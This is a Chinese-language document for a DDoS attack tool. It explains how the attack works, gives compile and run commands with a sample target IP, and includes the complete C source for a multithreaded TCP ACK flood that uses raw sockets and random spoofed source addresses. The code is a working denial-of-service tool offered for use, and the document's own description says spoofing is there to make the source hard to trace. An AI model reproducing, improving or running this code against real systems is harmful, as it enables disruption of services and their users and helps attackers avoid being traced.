# DDoS 攻击工具文档

## 原理
该程序实现了一个简单的 DDoS 攻击（分布式拒绝服务攻击），通过发送大量伪造的 TCP 数据包来占用目标服务器的带宽或资源，从而使其无法正常响应合法用户的请求。程序利用原始套接字构造 IP 和 TCP 头部，随机化源 IP 地址和端口，以达到隐蔽的效果。

## 目标
该工具的目标是指定的 IP 地址，用户在运行程序时需提供目标 IP。程序将并发启动多个线程，通过每个线程向目标发送大量的 TCP 数据包。

## 功能
- 通过创建原始套接字来发送伪造的 IP/TCP 数据包。
- 支持多线程发送数据包，以提高攻击效率。
- 允许用户设置每秒发送的数据包数量限制，以控制攻击强度。
- 伪造源 IP 地址，增加了追踪攻击来源的难度。
- 提供随机的目标端口和序列号，增加攻击包的随机性。

## 使用方法
### 编译
首先，确保您的系统中安装了 GCC 编译器。使用以下命令编译源代码：
```bash
gcc -o flood_ddos flood_ddos.c -lpthread
```
### 运行
使用以下命令启动 DDoS 攻击工具：
```bash
./flood_ddos <目标 IP> <线程数> <每秒包数限制 (-1 表示不限制)> <持续时间 (秒)>
```
### 示例
```bash
./flood_ddos 192.168.1.10 10 100 60
```
上面的命令将对 IP 地址为 192.168.1.10 的目标启动 10 个线程，每秒发送最多 100 个数据包，并持续攻击 60 秒。

```c
/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>         // 提供 sleep 和 usleep 等函数
#include <time.h>           // 提供 time 函数用于随机数种子
#include <sys/types.h>      // 提供基本的系统数据类型
#include <sys/socket.h>     // 提供套接字相关的定义
#include <sys/ioctl.h>      // 提供控制设备相关的函数
#include <string.h>         // 提供字符串操作函数
#include <stdlib.h>         // 提供标准库函数，如 malloc, atoi 等
#include <stdio.h>          // 提供输入输出函数
#include <pthread.h>        // 提供线程相关函数
#include <netinet/tcp.h>    // 提供 TCP 协议的结构和常量
#include <netinet/ip.h>     // 提供 IP 协议的结构和常量
#include <netinet/in.h>     // 提供地址族的定义
#include <netinet/if_ether.h> // 提供以太网头部的定义
#include <netdb.h>          // 提供与主机和网络相关的函数
#include <net/if.h>         // 提供网络接口相关的定义
#include <arpa/inet.h>      // 提供 IP 地址转换函数

 // 定义最大数据包大小
#define MAX_PACKET_SIZE 65534
// 定义一个常量，用于随机数生成器中的操作
#define PHI 0x9e3779b9

// 伪随机数生成器的状态和计数器
static unsigned long int Q[4096], c = 362436;
// 用于控制发送速率
volatile int limiter;
// 记录每秒发送的包数
volatile unsigned int pps;
// 控制线程的休眠时间（以微秒为单位）
volatile unsigned int sleeptime = 100;

// 初始化随机数生成器，基于输入种子
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

// 伪随机数生成函数，使用 CMWC (Complementary Multiply with Carry) 算法
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

// 计算校验和，用于 IP 头部
unsigned short csum(unsigned short* buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) { sum += *(unsigned char*)buf; }
    while (sum >> 16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

// 计算 TCP 校验和，基于 IP 头和 TCP 头
unsigned short tcpcsum(struct iphdr* iph, struct tcphdr* tcph) {

    struct tcp_pseudo // 定义伪头，用于校验计算
    {
        unsigned long src_addr;  // 源地址
        unsigned long dst_addr;  // 目标地址
        unsigned char zero;      // 填充的 0
        unsigned char proto;     // 协议（TCP）
        unsigned short length;   // TCP 长度
    } pseudohead;

    // 设置伪头的字段
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    // 计算校验和所需的总长度
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);

    // 分配内存用于校验计算
    unsigned short* tcp = malloc(totaltcp_len);
    memcpy((unsigned char*)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char*)tcp + sizeof(struct tcp_pseudo), (unsigned char*)tcph, sizeof(struct tcphdr));

    // 计算并返回 TCP 校验和
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

// 设置 IP 头部的各个字段
void setup_ip_header(struct iphdr* iph)
{
    iph->ihl = 5;                      // IP 头长度
    iph->version = 4;                  // IPv4 协议
    iph->tos = 0;                      // 服务类型
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // 总长度
    iph->id = htonl(54321);            // 标识符
    iph->frag_off = 0;                 // 不分片
    iph->ttl = MAXTTL;                 // TTL（生存时间）
    iph->protocol = 6;                 // 协议类型（TCP）
    iph->check = 0;                    // 校验和
    iph->saddr = inet_addr("192.168.3.100"); // 源 IP 地址
}

// 设置 TCP 头部的各个字段
void setup_tcp_header(struct tcphdr* tcph)
{
    tcph->source = rand();            // 源端口
    tcph->seq = rand();               // 序列号
    tcph->ack_seq = rand();           // 确认号
    tcph->res2 = 0;                   // 保留位
    tcph->doff = 5;                   // TCP 头部长度
    tcph->ack = 1;                    // ACK 位
    tcph->window = rand();            // 窗口大小
    tcph->check = 0;                  // 校验和
    tcph->urg_ptr = 0;                // 紧急指针
}
// 线程函数：用于对目标进行洪水攻击
void* flood(void* par1)
{
    char* td = (char*)par1;                   // 将传入的目标 IP 地址转换为字符串
    char datagram[MAX_PACKET_SIZE];            // 定义存储数据包的缓冲区
    struct iphdr* iph = (struct iphdr*)datagram; // 定义 IP 头部指针，指向缓冲区
    struct tcphdr* tcph = (void*)iph + sizeof(struct iphdr); // TCP 头部紧随 IP 头部之后

    // 初始化目标地址的 sockaddr_in 结构
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;                  // 设置地址族为 IPv4
    sin.sin_port = rand();                     // 随机生成目标端口号
    sin.sin_addr.s_addr = inet_addr(td);       // 将目标 IP 地址转换为网络字节序并存储

    // 创建一个原始套接字用于发送自定义 IP/TCP 数据包
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {                                // 如果创建套接字失败，输出错误信息并退出
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    // 清空数据包缓冲区
    memset(datagram, 0, MAX_PACKET_SIZE);

    // 设置 IP 和 TCP 头部
    setup_ip_header(iph);
    setup_tcp_header(tcph);

    // 设置 TCP 头部中的目标端口号为随机值
    tcph->dest = rand();

    // 设置 IP 头部中的目标 IP 地址和校验和
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short*)datagram, iph->tot_len);

    int tmp = 1;
    const int* val = &tmp;

    // 设置套接字选项，以允许自定义 IP 头部
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    // 初始化随机数种子，基于当前时间
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;

    // 无限循环，发送伪造的 TCP 数据包
    while (1) {
        // 使用 sendto 函数发送数据包到目标地址
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));

        // 随机化源 IP 地址和其他 IP/TCP 头部的字段以伪造包
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short*)datagram, iph->tot_len);

        // 更新 TCP 头部的序列号和源端口
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);

        // 重新计算 TCP 校验和
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        // 记录发送的包数
        pps++;

        // 控制速率限制，根据 `limiter` 和 `sleeptime` 进行休眠
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

int main(int argc, char* argv[])
{
    // 检查命令行参数是否足够，否则输出错误提示并退出
    if (argc < 5) {
        fprintf(stderr, "Improper ACK flood parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }

    fprintf(stdout, "Setting up Sockets...\n");

    // 从命令行参数中读取线程数量和每秒数据包发送上限
    int num_threads = atoi(argv[2]);
    int maxpps = atoi(argv[3]);

    // 初始化变量
    limiter = 0;    // 控制每次发送多少包
    pps = 0;        // 记录每秒发送的包数

    // 创建线程数组，用于并发攻击
    pthread_t thread[num_threads];

    // 设置控制发送速率的倍率
    int multiplier = 100;

    int i;
    // 创建多个线程并发执行 `flood` 函数，每个线程执行一个攻击任务
    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
    }

    fprintf(stdout, "Starting Flood...\n");

    // 根据时间参数，控制攻击的持续时间
    for (i = 0; i < (atoi(argv[4]) * multiplier); i++)
    {
        // 每个循环等待 10 毫秒（1000 / 100ms）
        usleep((1000 / multiplier) * 1000);

        // 如果当前每秒发送的包数超出限制，调整休眠时间和 limiter
        if ((pps * multiplier) > maxpps)
        {
            if (1 > limiter)
            {
                sleeptime += 100; // 增加休眠时间
            }
            else {
                limiter--;       // 减少发送包的数量
            }
        }
        else {
            // 如果包数小于限制，减少休眠时间或增加 limiter
            limiter++;
            if (sleeptime > 25)
            {
                sleeptime -= 25;
            }
            else {
                sleeptime = 0;  // 保证 sleeptime 不低于 0
            }
        }
        // 重置每秒发送包的计数
        pps = 0;
    }

    return 0;
}
```